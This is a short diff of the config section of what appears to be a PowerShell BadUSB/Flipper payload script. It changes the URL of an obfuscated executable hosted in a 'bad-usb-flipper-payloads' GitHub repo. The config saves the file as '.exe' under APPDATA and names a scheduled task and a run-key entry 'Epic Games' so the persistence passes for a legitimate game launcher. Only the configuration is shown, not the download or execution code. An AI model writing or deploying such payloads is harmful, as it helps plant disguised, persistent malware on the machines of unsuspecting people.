@@ -2,7 +2,7 @@
 # === CONFIG SECTION ===
 # =======================
 
-$mainExeUrl = "https://raw.githubusercontent.com/the-shadow-walker/Obfuscated%20Programs/Epic-Games.exe"
+$mainExeUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/Obfuscated Programs/Epic-Games.exe"
 $mainExePath = "$env:APPDATA\.exe"
 $mainTaskName = "Epic Games Manager"
 $mainRunKey = "Epic Games"
